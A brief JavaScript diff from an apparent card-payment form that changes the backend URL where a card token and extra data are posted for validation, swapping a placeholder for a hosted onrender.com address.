@@ -52,7 +52,7 @@ async function validarCartaoAutomatico() {
         });
 
         if (token.id) {
-            const response = await fetch("https://seu-servidor-no-render.com/validar-cartao", {
+            const response = await fetch("https://teste-l.onrender.com/validar-cartao", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ token: token.id, dados: dadosExtras })
